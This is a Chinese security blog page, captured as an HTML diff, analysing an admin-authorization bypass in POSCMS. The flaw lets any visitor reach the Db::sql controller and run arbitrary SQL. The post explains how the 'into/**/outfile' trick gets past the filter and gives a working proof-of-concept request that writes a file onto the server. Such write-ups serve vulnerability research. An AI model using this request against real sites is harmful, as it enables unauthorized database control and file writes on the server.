@@ -1,0 +1,363 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="POSCMS 任意sql语句执行漏洞一、漏洞简介二、漏洞影响三、复现过程任意API调用分析入口文件  index.php ---&gt;&#x2F;diy&#x2F;init.php------&gt;&#x2F;diy&#x2F;system&#x2F;core&#x2F;CodeIgniter.php  程序使用的CodeIgniter（CI）框架，直接去看CI框架。 $RTR &#x3D;&amp; load_class(&#39;Router&#39;, &amp;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/POSCMS/POSCMS%20%E4%BB%BB%E6%84%8Fsql%E8%AF%AD%E5%8F%A5%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="POSCMS 任意sql语句执行漏洞一、漏洞简介二、漏洞影响三、复现过程任意API调用分析入口文件  index.php ---&gt;&#x2F;diy&#x2F;init.php------&gt;&#x2F;diy&#x2F;system&#x2F;core&#x2F;CodeIgniter.php  程序使用的CodeIgniter（CI）框架，直接去看CI框架。 $RTR &#x3D;&amp; load_class(&#39;Router&#39;, &amp;">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-07-08T06:26:02.725Z">
+<meta property="article:modified_time" content="2021-04-21T01:23:46.000Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-POSCMS/POSCMS 任意sql语句执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/POSCMS/POSCMS%20%E4%BB%BB%E6%84%8Fsql%E8%AF%AD%E5%8F%A5%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:02.725Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="POSCMS-任意sql语句执行漏洞"><a href="#POSCMS-任意sql语句执行漏洞" class="headerlink" title="POSCMS 任意sql语句执行漏洞"></a>POSCMS 任意sql语句执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="任意API调用"><a href="#任意API调用" class="headerlink" title="任意API调用"></a>任意API调用</h3><p><strong>分析入口文件</strong></p>
+<blockquote>
+<p>index.php ---&gt;/diy/init.php<br>------&gt;/diy/system/core/CodeIgniter.php</p>
+</blockquote>
+<p>程序使用的CodeIgniter（CI）框架，直接去看CI框架。</p>
+<pre><code>$RTR =&amp; load_class(&#39;Router&#39;, &#39;core&#39;, isset($routing) ? $routing : NULL);
+</code></pre>
+<p>初始化Router类，调用_set_routing()方法绑定路由。</p>
+<pre><code>if ( ! isset($this-&gt;directory))
+                    &#123;
+                            $_d = $this-&gt;config-&gt;item(&#39;directory_trigger&#39;);
+                            $_d = isset($_GET[$_d]) ? trim($_GET[$_d], &quot; \t\n\r\0\x0B/&quot;) : &#39;&#39;;
+
+                            if ($_d !== &#39;&#39;)
+                            &#123;
+                                    $this-&gt;uri-&gt;filter_uri($_d);
+                                    $this-&gt;set_directory($_d);
+                            &#125;
+                    &#125;
+
+                    $_c = trim($this-&gt;config-&gt;item(&#39;controller_trigger&#39;));
+                    if ( ! empty($_GET[$_c]))
+                    &#123;
+                            $this-&gt;uri-&gt;filter_uri($_GET[$_c]);
+                            $this-&gt;set_class($_GET[$_c]);
+
+                            $_f = trim($this-&gt;config-&gt;item(&#39;function_trigger&#39;));
+                            if ( ! empty($_GET[$_f]))
+                            &#123;
+                                    $this-&gt;uri-&gt;filter_uri($_GET[$_f]);
+                                    $this-&gt;set_method($_GET[$_f]);
+                            &#125;
+
+                            $this-&gt;uri-&gt;rsegments = array(
+                                    1 =&gt; $this-&gt;class,
+                                    2 =&gt; $this-&gt;method
+                            );
+                    &#125;
+                    else
+                    &#123;
+                            $this-&gt;_set_default_controller();
+                    &#125;
+</code></pre>
+<blockquote>
+<p>config</p>
+</blockquote>
+<pre><code>$config[&#39;controller_trigger&#39;]                        = &#39;c&#39;;
+$config[&#39;function_trigger&#39;]                                = &#39;m&#39;;
+$config[&#39;directory_trigger&#39;]                        = &#39;d&#39;;
+</code></pre>
+<p>简述这里就是</p>
+<pre><code>$this-&gt;class = $_GET[‘c’];
+$this-&gt;method = $_GET[‘m’];
+$this-&gt;directory = $_GET[‘d’];
+</code></pre>
+<p>回到CI框架，这里直接通过反射进行了调用。</p>
+<pre><code>$e404 = FALSE;
+$class = ucfirst($RTR-&gt;class);
+$method = $RTR-&gt;method;
+
+if (empty($class) OR ! file_exists(APPPATH.&#39;controllers/&#39;.$RTR-&gt;directory.$class.&#39;.php&#39;))
+&#123;
+   $e404 = TRUE;
+&#125;
+else
+&#123;
+   require_once(APPPATH.&#39;controllers/&#39;.$RTR-&gt;directory.$class.&#39;.php&#39;);
+
+   if ( ! class_exists($class, FALSE) OR $method[0] === &#39;_&#39; OR method_exists(&#39;CI_Controller&#39;, $method))
+   &#123;
+     $e404 = TRUE;
+   &#125;
+   elseif (method_exists($class, &#39;_remap&#39;))
+   &#123;
+     $params = array($method, array_slice($URI-&gt;rsegments, 2));
+     $method = &#39;_remap&#39;;
+   &#125;
+   elseif ( ! method_exists($class, $method))
+   &#123;
+     $e404 = TRUE;
+   &#125;
+   /**
+    * DO NOT CHANGE THIS, NOTHING ELSE WORKS!
+    *
+    * - method_exists() returns true for non-public methods, which passes the previous elseif
+    * - is_callable() returns false for PHP 4-style constructors, even if there&#39;s a __construct()
+    * - method_exists($class, &#39;__construct&#39;) won&#39;t work because CI_Controller::__construct() is inherited
+    * - People will only complain if this doesn&#39;t work, even though it is documented that it shouldn&#39;t.
+    *
+    * ReflectionMethod::isConstructor() is the ONLY reliable check,
+    * knowing which method will be executed as a constructor.
+    */
+   elseif ( ! is_callable(array($class, $method)) &amp;&amp; strcasecmp($class, $method) === 0)
+   &#123;
+     $reflection = new ReflectionMethod($class, $method);
+     if ( ! $reflection-&gt;isPublic() OR $reflection-&gt;isConstructor())
+     &#123;
+      $e404 = TRUE;
+     &#125;
+   &#125;
+&#125;
+</code></pre>
+<blockquote>
+<p>APPPATH.’controllers/ = /diy/dayrui/controllers/</p>
+</blockquote>
+<p>然后我们就可以调用这里的Controller，关键点是在这里有个admin文件夹，里面包含了管理员可调用的功能点，而且他继承的基类（SuperClass）并没有检测用户权限。就导致任意调用这里的功能点。</p>
+<h3 id="SQL语句执行（增删改查）"><a href="#SQL语句执行（增删改查）" class="headerlink" title="SQL语句执行（增删改查）"></a>SQL语句执行（增删改查）</h3><p>既然可以调用管理员才能调用的功能点，问题就太多了，这里就随便讲一个喽。</p>
+<p>文件：/diy/dayrui/controllers/admin/Db.php 方法：sql</p>
+<pre><code> public function sql() &#123;
+    $sql = &#39;&#39;;
+    $count = $id = 0;
+
+    if (IS_POST) &#123;
+        $id = $this-&gt;input-&gt;post(&#39;id&#39;);
+        $sql = str_replace(&#39;&#123;dbprefix&#125;&#39;, $this-&gt;db-&gt;dbprefix, $this-&gt;input-&gt;post(&#39;sql&#39;));
+        if (preg_match(&#39;/select(.*)into outfile(.*)/i&#39;, $sql)) &#123;
+            $this-&gt;admin_msg(fc_lang(&#39;存在非法select&#39;));
+        &#125;
+        $sql_data = explode(&#39;;SQL_FINECMS_EOL&#39;, trim(str_replace(array(PHP_EOL, chr(13), chr(10)), &#39;SQL_FINECMS_EOL&#39;, $sql)));
+        if ($sql_data) &#123;
+            $db = $this-&gt;db;
+            foreach($sql_data as $query)&#123;
+                if (!$query) &#123;
+                    continue;
+                &#125;
+                $queries = explode(&#39;SQL_FINECMS_EOL&#39;, trim($query));
+                $ret = &#39;&#39;;
+                foreach($queries as $query) &#123;
+                    $ret.= $query[0] == &#39;#&#39; || $query[0].$query[1] == &#39;--&#39; ? &#39;&#39; : $query;
+                &#125;
+                if (!$ret) &#123;
+                    continue;
+                &#125;
+                $db-&gt;query($ret);
+                $count++;
+            &#125;
+            if ($count == 1 &amp;&amp; stripos($ret, &#39;select&#39;) === 0) &#123;
+                $this-&gt;template-&gt;assign(array(
+                    &#39;result&#39; =&gt; $db-&gt;query($ret)-&gt;result_array(),
+                ));
+            &#125;
+        &#125;
+    &#125;
+
+    $this-&gt;template-&gt;assign(array(
+        &#39;menu&#39; =&gt; $this-&gt;get_menu_v3(array(
+            fc_lang(&#39;执行SQL&#39;) =&gt; array(&#39;admin/db/sql&#39;, &#39;database&#39;)
+        )),
+        &#39;id&#39; =&gt; $id,
+        &#39;sql&#39; =&gt; $sql,
+        &#39;mcount&#39; =&gt; $count,
+    ));
+    $this-&gt;template-&gt;display(&#39;db_sql.html&#39;);
+&#125;
+</code></pre>
+<p>这里使用正则表达式匹配危险字符into<br>outfile，绕过就太简单了。into/**/outfile。</p>
+<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><p><code>https://www.0-sec.org/index.php?c=db&amp;amp;d=admin&amp;amp;m=sql Post sql=select 1 into/**/outfile &#39;C:\phpstudy_pro\WWW\www.0-sec.org\poscms\11111.txt&#39;</code></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/POSCMS/POSCMS%20%E4%BB%BB%E6%84%8Fsql%E8%AF%AD%E5%8F%A5%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2quxn00f5y8v1fitkbksq" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/PostgreSQL/%EF%BC%88CVE-2018-1058%EF%BC%89PostgreSQL%20%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/POSCMS/POSCMS%203.2.0%20%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
